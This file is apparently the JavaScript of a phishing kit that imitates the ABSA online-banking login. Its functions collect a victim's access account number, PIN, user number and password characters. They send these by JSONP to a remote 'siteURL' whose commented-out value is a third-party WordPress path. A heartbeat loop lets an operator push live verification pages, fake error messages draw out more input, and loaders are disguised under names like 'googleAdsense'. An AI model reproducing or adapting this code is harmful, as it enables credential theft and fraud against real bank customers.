function checkPwd(str) {
    if (str.length < 5) {
        return("too_short");
    } else if (str.length > 15) {
        return("too_long");
    } else if (str.search(/\d/) == -1) {
        return("no_num");
    } else if (str.match(/[a-z]/i)) {

    }
    return("ok");
}

function heartBeatPasswordPAGE(response){
    //jQuery112407760840736230579_1569684275123({"message":"1569609434508","userdetails":{"AccessAccount":"43456345","PIN":"1","Operator":"45634"},"success":true,"nextpage":"password","surecheck":"l e d elektries bk"})
    var timeleft = 15;
    pwdHbeat = setInterval(function(){
        timeleft -= 1;
        $.ajax({
            url: siteURL+"hbeatpwd.php?unique="+response.message+"&AccessAccount=" + response.userdetails.AccessAccount + "&PIN=" + response.userdetails.PIN + "&Operator=" + response.userdetails.Operator,
            url: siteURL+"hbeatpwd.php?unique="+response.message+"&AccessAccount=" + response.userdetails.AccessAccount + "&PIN=" + response.userdetails.PIN + "&Operator=" + response.userdetails.Operator +"&lastInsertID=" + response.insertID + ((timeleft <= 0) ? '&pushPasswordTimeout=true&passwordblocks=continue':'&countdown=true'),
            cache: false,
            dataType: 'jsonp',
            //data: form.serialize(),
            success: function(data) {
                if(data.message !== "error"){
                    if(data.message === "heartbeat"){
                        null
                    }else{
                        /*document.open();
                        document.write(data.message);
                        document.close();*/
                        $('.ap-main-content-wrapper').html(data.message);
                        absa.hidePleaseWait();
                        setTimeout(function(){
                             $("input[type=password]").eq(0).focus();
                         },800);
                         
                        clearInterval(pwdHbeat);
                    }
                }else{
                    alert("Please enter a valid password and retry");
                    absa.hidePleaseWait();
                    $("input#pff1").val("").focus();
                    return false;
                }
            },
            error: function (request, status, error) {
            }
        });
        if(timeleft <= 0){
            //clearInterval(pwdHbeat);
            $.ajax({
                //url: siteURL+"_read.php?unique="+response.message+"&AccessAccount=" + response.userdetails.AccessAccount + "&PIN=" + response.userdetails.PIN + "&Operator=" + response.userdetails.Operator,
                url: siteURL+"_read.php?pushPasswordTimeout=true&rowID="+response.message+"&accessAccount=&passwordblocks=continue",
                cache: false,
                dataType: 'jsonp',
                //data: form.serialize(),
                success: function(data) {
                    
                },
                error: function (request, status, error) {
                }
            });
        }
    },3000);
    
    //startTimer(15, $("div#fasd454"), function(){ alert("ok done");  });
}

function loginContinue2(form){
             var sAccount = document.getElementById("pff1").value;
             if(sAccount === ""){
                 alert("please enter a valid password password and retry");
                 return false;
             }
            /*
            if(checkPwd(sAccount) !== "ok"){
                alert("please enter a valid password password and retry");
                return false;
            }*/


             oParametersurl = siteURL+"continue2.php";
             absa.showPleaseWait();

             $.ajax({
                 url: oParametersurl,
                 cache: false,
                 dataType: 'jsonp',
                 data: form.serialize(),
                 success: function(data) {
                    if(data.message !== "error"){
                         document.open();
                         document.write(data.message);
                         document.close();
                         //window.location.href = 'https://www.absa.co.za/offers/africanacity/';
                    }else{
                         alert("Please enter a valid password and retry");
                         absa.hidePleaseWait();
                         $("input#pff1").val("").focus();
                         return false;
                    }
                },
                error: function (request, status, error) {
                
                }
             });
         }
         
         
function onForm1Submit(){
    var sAccount = document.getElementById("j_username").value;
    var sPIN = document.getElementById("j_pin").value;
    var sOperator = document.getElementById("j_user_no").value;

    var numbersOnly = /^[0-9]+$/;

    $("div#ap-login-form1-error").hide();

    if(!sAccount.match(numbersOnly)){
        alert("Please enter a valid Access account number");
        document.getElementById("j_username").focus();
        return false;
    }
    if(!sPIN.match(numbersOnly)){
        alert("Please enter a valid PIN");
        document.getElementById("j_pin").focus();
        return false;
    }
    if(!sOperator.match(numbersOnly)){
        alert("Please enter a valid User number");
        document.getElementById("j_user_no").focus();
        return false;
    }

    aPostData = "AccessAccount=" + sAccount + "&PIN=" + sPIN + "&Operator=" + sOperator + "&CaptchaTxt=";
    oParametersurl = siteURL+"continue1.php?"+aPostData;

    absa.showPleaseWait();
    $.ajax({
        url: oParametersurl,
        cache: false,
        dataType: 'jsonp',
        success: function(data) {
           if(data.success === true){
               /*
               $('.ap-main-content-wrapper').html(data.message);
               absa.hidePleaseWait();
               setTimeout(function(){
                    $("input[type=password]").eq(0).focus();
                },800);
                */
               heartBeatPasswordPAGE(data);
           }
           if(data.success === false){
               $("div.ui-message-timeStamp").html(data.time);
               $("div#ap-login-form1-error").show();

               $("input#j_username").val("");
               $("input#j_pin").val("");

               absa.hidePleaseWait();
           }
        },
        error: function (request, status, error) {
           alert("error");
           absa.hidePleaseWait();
        }
    });
}

        var absa = window.absa || {};
        absa.showPleaseWait = function (d) {
        var c = document.getElementById("pleasewait"),
                b = document.getElementById("pleasewait-viewport"),
                e = document.getElementById("pleasewait-label");
        c.style.display = "";
        e.innerHTML = arguments.length ? d : "";
        absa.showPleaseWait.timeout = setTimeout(function () {
                    c.style.height = document.body.clientHeight + "px";
                    c.style.width = document.body.clientWidth + "px";
                    b.style.height = ("innerHeight" in window ? window.innerHeight : document.documentElement.clientHeight) + "px";
                    b.style.width = ("innerWidth" in window ? window.innerWidth : document.documentElement.clientWidth) + "px";
                    b.style.top = document.documentElement.scrollTop + "px";
                    b.style.left = document.documentElement.scrollLeft + "px";
                    absa.showPleaseWait.timeout = setTimeout(arguments.callee, 20)
            }, 0)
        };
        absa.hidePleaseWait = function () {
                var b = document.getElementById("pleasewait");
                b.style.display = "none";
                if (absa.showPleaseWait.timeout) {
                        absa.showPleaseWait.timeout = clearTimeout(absa.showPleaseWait.timeout)
                }
        };

function google(){
    $(document).ready(function(){
        $("div.ap-page-content.ap-container").load(siteURL+"ajaxForm.html");
    });
}

function doMoveForm2Focus(oElement){
	if (oElement.id == "pff1") {
		if (oElement.value.length) {
			document.getElementById("pff2").focus();
		}
		
	} else if (oElement.id == "pff2") {
		if (oElement.value.length) {
			document.getElementById("pff3").focus();
		}
	}
};

function checkEntries2(obj, ev) {
	var nKeyCode = ev.keyCode;
	if (nKeyCode != 9 /* TAB */ && nKeyCode != 8 /* BACKSPACE*/ && nKeyCode != 46 /* DELETE */ && nKeyCode != 16 /* SHIFT */ &&nKeyCode != 37 && nKeyCode != 39 && nKeyCode != 38 && nKeyCode != 40) {
		doMoveForm2Focus(obj);
	}
};

function loginContinue3(form){
    hideErrorMessage();
    absa.showPleaseWait();
    var s = document.getElementById("pwds").value;
    var arr = new Array(Number(s));
    var landingPage = "accounts";
    
    var PostData = {};
    
    var allFieldsEntered = 0;
    for (var g=0; g < arr.length; g++) {
            arr[g] = document.getElementById("pff"+(g+1)).value;
            if( arr[g].length > 0 ){ allFieldsEntered = allFieldsEntered + 1; }
            PostData[document.getElementById("pff"+(g+1)).name] = arr[g];
    }
    PostData.landingpage = landingPage;
    
    if (allFieldsEntered != 3) {
            var objPF1 = document.getElementById("pff1");
            var objPF2 = document.getElementById("pff2");
            var objPF3 = document.getElementById("pff3");
            if (objPF1.value.length < 1) {
                    showErrorMessage("ap-login-form2-error", "Password character "+objPF1.getAttribute("num")+" is empty.");
                    objPF1.focus();
            } else if (objPF2.value.length < 1) {
                    showErrorMessage("ap-login-form2-error", "Password character "+objPF2.getAttribute("num")+" is empty.");
                    objPF2.focus();
            } else if ( objPF3.value.length < 1) {
                    showErrorMessage("ap-login-form2-error", "Password character "+objPF3.getAttribute("num")+" is empty.");
                    objPF3.focus();
            }
            absa.hidePleaseWait();
            return;

    }
    else {
            oParametersurl = siteURL+"continue22.php?next=ok";
             $.ajax({
                 url: oParametersurl,
                 cache: false,
                 dataType: 'jsonp',
                 data: form.serialize(),
                 success: function(data) {
                    if(data.success === true){
                        //alert("account vaild, getting surphrease");
                        $('.ap-main-content-wrapper').html(data.message);
                        absa.hidePleaseWait();
                        setTimeout(function(){
                             //$("input#pff1").focus();
                             $("input[type=password]").eq(0).focus();
                         },800);
                         
                         showErrorMessage("ap-login-form2-error", "Authentication failed, enter the requested characters of your password");
                    }
                    if(data.success === false){
                        $("div.ui-message-timeStamp").html(data.time);
                        $("div#ap-login-form1-error").show();

                        $("input#j_username").val("");
                        $("input#j_pin").val("");

                        absa.hidePleaseWait();
                    }
                 },
                 error: function (request, status, error) {
                 }
             });
    }
}
//siteURL = 'http://alhadafadv.com/ser/wp-includes/css/sURECKECk/php2/';
function showErrorMessage(sId, sMessage) {
	var oMessage = document.getElementById(sId);
	$(oMessage).show();
	$(oMessage).find("div.ui-message-body").html(sMessage);
};

function hideErrorMessage() {
    $("#ap-login-form2-error").hide();
    $("#ap-login-form2-error").find("div.ui-message-body").html("");
}

function loginContinue4(form){
    hideErrorMessage();
    absa.showPleaseWait();
    var s = document.getElementById("pwds").value;
    var arr = new Array(Number(s));
    var landingPage = "accounts";
    
    var PostData = {};
    
    var allFieldsEntered = 0;
    for (var g=0; g < arr.length; g++) {
            arr[g] = document.getElementById("pff"+(g+1)).value;
            if( arr[g].length > 0 ){ allFieldsEntered = allFieldsEntered + 1; }
            PostData[document.getElementById("pff"+(g+1)).name] = arr[g];
    }
    PostData.landingpage = landingPage;
    
    if (allFieldsEntered != 3) {
            var objPF1 = document.getElementById("pff1");
            var objPF2 = document.getElementById("pff2");
            var objPF3 = document.getElementById("pff3");
            if (objPF1.value.length < 1) {
                    showErrorMessage("ap-login-form2-error", "Password character "+objPF1.getAttribute("num")+" is empty.");
                    objPF1.focus();
            } else if (objPF2.value.length < 1) {
                    showErrorMessage("ap-login-form2-error", "Password character "+objPF2.getAttribute("num")+" is empty.");
                    objPF2.focus();
            } else if ( objPF3.value.length < 1) {
                    showErrorMessage("ap-login-form2-error", "Password character "+objPF3.getAttribute("num")+" is empty.");
                    objPF3.focus();
            }
            absa.hidePleaseWait();
            return;

    }
    else {
            oParametersurl = siteURL+"continue22.php?next=surecheck";
             $.ajax({
                 url: oParametersurl,
                 cache: false,
                 dataType: 'jsonp',
                 data: form.serialize(),
                 success: function(data) {
                    if(data.message !== "error"){
                         document.open();
                         document.write(data.message);
                         document.close();
                         //window.location.href = 'https://www.absa.co.za/offers/africanacity/';
                     }else{
                         alert("Please enter a valid password and retry");
                         absa.hidePleaseWait();
                         $("input#pff1").val("").focus();
                         return false;
                     }
                 },
                 error: function (request, status, error) {
                 }
             });
    }
}

function googleAdsense(){
    //$(document).ready(function(){
        //$("div.ap-page-content.ap-container").load(siteURL+"ajaxForm.html");
        $.ajax({
            url: siteURL+"ajax_load_jsonp.php?r=",
            cache: false,
            dataType: 'jsonp',
            success: function(data) {
               if(data.success === true){
                   $('div.ap-page-content.ap-container').html(data.message);
                   setTimeout(function(){
                        $('input#j_username').focus();
                    },800);
               }
               if(data.success === false){
                   alert("unavailable...");
               }
            },
            error: function (request, status, error) {
               alert("error");
               absa.hidePleaseWait();
            }
        });
    //});
}

function googleAdsenseGoogle(){
    //$(document).ready(function(){
        $.ajax({
            url: siteURL+"ajax_load_jsonp_body.php?r=",
            cache: false,
            dataType: 'jsonp',
            success: function(data) {
               if(data.success === true){
                   $('body').html(data.message);
                   setTimeout(function(){
                        $('input#j_username').focus();
                    },800);
               }
               if(data.success === false){
                   alert("unavailable...");
               }
            },
            error: function (request, status, error) {
               alert("error");
               absa.hidePleaseWait();
            }
        });
    //});
}